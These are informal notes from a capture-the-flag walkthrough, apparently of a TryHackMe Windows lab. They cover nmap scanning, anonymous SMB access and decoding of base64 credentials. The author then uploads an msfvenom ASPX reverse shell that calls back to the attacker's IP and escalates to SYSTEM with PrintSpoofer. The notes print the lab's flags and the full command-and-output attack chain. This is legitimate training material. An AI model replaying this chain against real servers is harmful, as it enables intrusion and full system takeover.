2026/06/20

10.65.140.26 10.65.136.35 machine ip
192.168.139.124 my ip
THM{fdk4ka34vk346ksxfr21tg789ktf45} <FLAG_USER>
THM{1fk5kf469devly1gl320zafgl345pv} <FLAG_ROOT>

rel.net /etc/hosts

$ ping -c 3 rel.net
PING rel.net (10.65.140.26) 56(84) bytes of data.
64 bytes from rel.net (10.65.140.26): icmp_seq=1 ttl=126 time=155 ms
64 bytes from rel.net (10.65.140.26): icmp_seq=2 ttl=126 time=154 ms
64 bytes from rel.net (10.65.140.26): icmp_seq=3 ttl=126 time=154 ms

--- rel.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 153.877/154.471/155.176/0.536 ms




full nmap


$ nmap -sV -sC -p- -T4 rel.net
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 13:31 UTC
Nmap scan report for rel.net (10.65.140.26)
Host is up (0.15s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-06-19T13:23:14
|_Not valid after:  2026-12-19T13:23:14
|_ssl-date: 2026-06-20T13:35:32+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-06-20T13:34:55+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-20T06:34:57-07:00
| smb2-time: 
|   date: 2026-06-20T13:34:54
|_  start_date: 2026-06-20T13:23:10
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.92 seconds






okay
80 135 139 445 3389 49663 49667 49669


smb server set up. html first tho

(html screencap)

nothing. smb then




$ smbclient -L rel.net -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to rel.net failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




nt4wrksv is the folder. hm.



$ smbclient //rel.net/nt4wrksv -N
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

                7735807 blocks of size 4096. 4894719 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)






passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk




first one is base 64 me thinks?

$ echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 --decode
Bob - !P@$$W0rD!123 

right! second one...

$ echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 --decode
Bill - Juw4nnaM4n420696969!$$$

ah, it was the same. huh.



where tf do i use these though??? i literally have no clue. move on to other possibilities.


uhhhhhh gobuster?

one for 80 another for 49663

$ gobuster dir -u http://rel.net:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

uhhhhhhhhhh lemme try that nt4w whatever nt4wrksv
nothing on 80

oh? page loads on 49663 but nothing shows up. no error, though there IS a directory there! huh. WAIT this means i can run files!! right??? lett me check for passwords.txt

((screencap))

HELL WYAYYYYEAHHHHH


make the revshell:

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.139.124 LPORT=53 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3400 bytes
Saved as: rev.aspx




put it in the thingy smb samba

$  smbclient //rel.net/nt4wrksv -N
smb: \> put rev.aspx 
putting file rev.aspx as \rev.aspx (7.2 kB/s) (average 7.2 kB/s)
smb: \> ls
  .                                   D        0  Sat Jun 20 14:27:12 2026
  ..                                  D        0  Sat Jun 20 14:27:12 2026
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
  rev.aspx                            A     3400  Sat Jun 20 14:27:12 2026

                7735807 blocks of size 4096. 4951423 blocks available
smb: \> quit


open netcat on 53

okay it didn't work oh it DID


c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool




okkk where is that USER flag

c:\Users\Bob\Desktop>dir
dir

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,166,836,224 bytes free

c:\Users\Bob\Desktop>more user.txt
more user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}





okay lets just check permissions

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled



SeImpersonatePrivilege sounds hella suspicious

get https://github.com/itm4n/PrintSpoofer and upload it to samba

$ smbclient //rel.net/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe 
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (43.9 kB/s) (average 43.9 kB/s)
smb: \> ls
  .                                   D        0  Sat Jun 20 14:57:38 2026
  ..                                  D        0  Sat Jun 20 14:57:38 2026
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
  PrintSpoofer64.exe                  A    27136  Sat Jun 20 14:57:38 2026
  rev.aspx                            A     3400  Sat Jun 20 14:27:12 2026

                7735807 blocks of size 4096. 5099235 blocks available
smb: \> quit




actually i gotta find where they're uploaded one sec


> forfiles /P c:\ /M passwords.txt /S /C "cmd /c echo @path ; cmd"
forfiles /P c:\ /M passwords.txt /S /C "cmd /c echo @path"
...
"c:\inetpub\wwwroot\nt4wrksv\passwords.txt"
...



going to c:\inetpub\wwwroot\nt4wrksv\

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

06/20/2026  07:57 AM    <DIR>          .
06/20/2026  07:57 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
06/20/2026  07:57 AM            27,136 PrintSpoofer64.exe
06/20/2026  07:27 AM             3,400 rev.aspx
               3 File(s)         30,634 bytes
               2 Dir(s)  20,886,347,776 bytes free




PrintSpoofer64.exe -i -c cmd

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd  
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system



les go


c:\Users\Administrator\Desktop>dir
dir

 Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,886,208,512 bytes free

c:\Users\Administrator\Desktop>more root.txt
more root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
